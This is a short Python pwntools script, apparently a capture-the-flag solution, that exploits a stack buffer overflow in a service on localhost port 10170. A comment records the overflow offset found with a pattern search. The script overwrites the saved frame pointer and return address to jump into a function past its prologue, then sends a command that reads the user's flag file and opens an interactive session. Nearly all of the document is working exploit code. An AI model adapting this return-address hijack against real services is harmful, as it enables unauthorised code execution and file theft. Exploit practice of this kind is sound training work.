"""
pattern search $rsp
[+] Searching for '6861616161616161'/'6161616161616168' with period=8
[+] Found at offset 56 (little-endian search) likely
"""

from pwn import *

target = 0x400687 + 0x4 # skips function prologue
old_rbp = 0x7fffffffd960
payload = b'A' * 48 + p64(old_rbp) + p64(target)

conn = remote('localhost', 10170)
print(f'[+] Sending payload: {payload}')
conn.sendlineafter(b'2019.', payload)
conn.sendline(b'cat /home/$(whoami)/flag')
conn.interactive()



